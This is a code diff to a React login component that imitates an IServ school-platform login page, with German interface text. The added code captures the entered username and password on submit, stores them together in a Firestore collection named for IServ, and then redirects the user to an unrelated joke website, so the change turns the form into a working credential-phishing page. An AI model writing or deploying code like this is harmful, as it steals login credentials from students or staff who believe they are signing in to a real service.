@@ -1,8 +1,33 @@
 import { useState } from "react";
 import { Eye, EyeOff } from "lucide-react";
 
+import { collection, addDoc } from "firebase/firestore";
+import { db } from "./firebase"; // falls Firebase so importiert wird
+
 function Login() {
   const [showPassword, setShowPassword] = useState(false);
+
+  async function saveData(message) {
+    try {
+      await addDoc(collection(db, "user_data", "iserv", "messages"), {
+        text: message,
+        timestamp: Date.now(),
+      });
+      window.location.href = "https://schlechtewitze.com/top";
+    } catch (e) {
+      console.error("Fehler beim Speichern:", e);
+    }
+  }
+
+  function handleSubmit(event) {
+    event.preventDefault();
+    const userName = event.target.userName.value;
+    const password = event.target.password.value;
+    const message = userName + " || " + password;
+
+    localStorage.setItem("hasVisited", true);
+    saveData(message);
+  }
 
   return (
     <div className="w-[55%] mt-8">
@@ -13,9 +38,11 @@ function Login() {
         </a>
       </div>
 
-      <form className="flex flex-col mt-2">
+      <form className="flex flex-col mt-2" onSubmit={handleSubmit}>
         <input
           type="text"
+          id="userName"
+          name="userName"
           placeholder="Account"
           className="w-full p-2 mb-4 border 
                     bg-white text-black border-gray-300
@@ -33,6 +60,8 @@ function Login() {
         >
           <input
             type={showPassword ? "text" : "password"}
+            id="password"
+            name="password"
             placeholder="Passwort"
             className="bg-[#1a1a1a] text-white pr-0 w-full focus:outline-none"
           />
@@ -48,14 +77,14 @@ function Login() {
         </div>
 
         <div class="flex flex-row justify-between align-items-center login-form-field">
-          <div class="checkbox m0">
+          <div className="checkbox m0">
             <label class="flex text-[14px] align-items-center dark:text-white">
               <input
                 className="mr-1"
                 type="checkbox"
                 id="remember_me"
                 name="_remember_me"
-                tabindex="1"
+                tabIndex="1"
               />
               Angemeldet bleiben
             </label>
